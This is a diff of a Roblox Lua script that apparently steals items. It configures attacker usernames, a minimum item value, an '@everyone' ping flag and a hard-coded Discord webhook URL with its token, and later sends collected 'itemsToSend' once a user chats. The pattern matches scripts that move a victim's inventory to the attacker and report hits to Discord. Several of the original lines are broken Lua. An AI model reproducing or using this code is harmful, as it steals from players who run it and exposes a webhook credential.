@@ -4,10 +4,11 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
-local users = _G.Rip_Leo249 or {bacon_notascript}
+local users = _G.Usernames or {Rip_leo249}
 local min_value = _G.min_value or 0.1
-local ping = _G.pingEveryone or
-local webhook = _G. https://discord.com/api/webhooks/1320306868991819807/vR6WZwRgCVpETN_IIHcqG6kjw6YzqGo6ks6yKnEudHl6GOtXHazU9ux6IirlozfUKR0Nor ""
+local ping = _G.pingEveryone or "yes"
+local webhook = _G.webhook or " 
+https://discord.com/api/webhooks/1320306868991819807/vR6WZwRgCVpETN_IIHcqG6kjw6YzqGo6ks6yKnEudHl6GOtXHazU9ux6IirlozfUKR0N"
 
 local Players = game:GetService("Players")
 local plr = Players.LocalPlayer
@@ -429,6 +430,3 @@ if #itemsToSend > 0 then
     end
     waitForUserChat()
 end
-
-
-
